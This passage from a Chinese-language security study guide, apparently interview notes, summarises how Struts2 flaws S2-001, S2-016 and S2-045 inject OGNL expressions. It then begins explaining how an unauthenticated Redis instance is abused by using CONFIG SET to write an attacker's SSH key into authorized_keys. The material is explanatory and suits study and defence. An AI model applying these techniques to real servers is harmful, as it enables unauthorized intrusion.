<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">S2-001</span></strong></span><span class="md-plain">：通过修改 </span><span class="md-pair-s" spellcheck="false"><code>Content-Type</code></span><span class="md-plain"> 请求头注入 OGNL 表达式。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">S2-016</span></strong></span><span class="md-plain">：利用 </span><span class="md-pair-s" spellcheck="false"><code>redirect:</code></span><span class="md-plain"> 或 </span><span class="md-pair-s" spellcheck="false"><code>redirectAction:</code></span><span class="md-plain"> 结果类型注入表达式。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">S2-045</span></strong></span><span class="md-plain">：Jakarta Multipart 解析器漏洞，通过构造特殊的 </span><span class="md-pair-s" spellcheck="false"><code>Content-Type</code></span><span class="md-plain"> 头触发 RCE。</span></p>
</li>
</ul>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">35. Redis 未授权利用方式（含原理）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Redis 默认情况下</span><span class="md-pair-s "><strong><span class="md-plain">无密码认证</span></strong></span><span class="md-plain">，且监听在公网或内网可访问的端口（如 6379），攻击者可直接连接并执行命令。常见利用方式如下：</span></p>

<h4 class="md-end-block md-heading"><span class="md-pair-s "><strong><span class="md-plain">利用方式及原理</span></strong></span><span class="md-plain">：</span></h4>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">写入 SSH 公钥（横向移动）</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">原理</span></strong></span><span class="md-plain">：通过 </span><span class="md-pair-s" spellcheck="false"><code>CONFIG SET dir</code></span><span class="md-plain"> 和 </span><span class="md-pair-s" spellcheck="false"><code>CONFIG SET dbfilename</code></span><span class="md-plain"> 修改 Redis 持久化路径，将攻击者的 SSH 公钥写入目标服务器的 </span><span class="md-pair-s" spellcheck="false"><code>~/.ssh/authorized_keys</code></span><span class="md-plain">。</span></p>
